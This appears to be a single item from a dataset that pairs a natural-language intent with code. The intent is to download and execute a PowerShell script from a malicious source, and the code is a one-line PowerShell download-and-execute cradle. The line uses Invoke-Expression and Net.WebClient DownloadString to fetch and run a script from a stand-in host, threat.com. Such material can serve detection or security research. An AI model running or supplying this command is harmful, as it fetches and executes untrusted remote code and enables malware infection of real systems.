# Natural language intent:
# Download and execute a PowerShell script from a potentially malicious source.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://threat.com/Kernel32.ps1')"
